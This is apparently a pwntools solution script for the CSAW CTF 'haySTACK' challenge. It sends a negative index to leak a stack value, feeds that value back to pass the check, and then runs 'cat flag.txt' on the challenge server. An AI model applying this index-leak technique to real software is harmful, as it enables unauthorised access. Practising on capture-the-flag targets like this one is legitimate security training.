#!/usr/bin/python3
from pwn import *

LOCAL = False
DEBUG = False

def binary_connect():
  if LOCAL:
    if DEBUG:
      p = gdb.debug('./haySTACK', '''
          continue
      ''')
    else:
      p = process('./haySTACK')
  else:
    p = remote('pwn.chal.csaw.io', 5002)

  return p

def exploit(): 
  p = binary_connect()
  p.recvuntil('check?\n')
  p.send("-22\n")
  p.recvuntil(" number is ")
  resp = p.recv(10).decode('utf-8')
  resp = int(resp,16)
  p.recvuntil('check?\n')
  p.send(str(resp) + '\n')
  p.recv()
  p.send('cat flag.txt\n')
  print(p.recv())
  p.close()  

if __name__ == "__main__":
  context.log_level="debug"
  exploit()
